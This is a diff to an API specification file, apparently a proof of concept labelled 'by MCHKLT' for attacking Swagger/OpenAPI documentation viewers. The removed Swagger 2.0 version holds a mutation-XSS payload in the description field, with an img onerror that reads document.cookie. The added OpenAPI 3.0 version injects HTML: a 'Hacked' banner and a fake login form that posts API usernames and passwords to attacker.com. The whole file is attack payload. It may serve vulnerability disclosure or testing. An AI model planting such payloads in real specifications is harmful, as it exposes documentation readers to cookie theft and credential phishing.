@@ -1,18 +1,24 @@
-swagger: '2.0'
-info:
-  title: XSS PoC by MCHKLT
-  description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(`XSS executed! Cookie: ${document.cookie} \nDomain: ${window.origin}`)'>">
-  version: 1.0.0
-basePath: /api
-produces:
-  - application/json
-consumes:
-  - application/json
-paths:
-  /test:
-    get:
-      summary: Test endpoint
-      responses:
-        '200':
-          description: Successful response
+   openapi: 3.0.0
+   info:
+     title: HTML Injection PoC by MCHKLT
+     description: |
+       <h1 style="color:red; font-size:50px;">Hacked by MCHKLT!</h1>
+       <p>This is injected HTML. Imagine this as a phishing attack:</p>
+       <form action="https://attacker.com/steal-credentials" method="POST">
+         <label for="username">API Username:</label>
+         <input type="text" id="username" name="username" placeholder="Enter your username" style="width:300px;"><br><br>
+         <label for="password">API Password:</label>
+         <input type="password" id="password" name="password" placeholder="Enter your password" style="width:300px;"><br><br>
+         <button type="submit" style="background-color:red; color:white; padding:10px;">Login to Access API</button>
+       </form>
+       <p>Submitting this could send your credentials to an attacker.</p>
+     version: 1.0.0
+   servers:
+     - url: https://example.com/api
+   paths:
+     /test:
+       get:
+         summary: Test Endpoint
+         responses:
+           '200':
+             description: Successful response
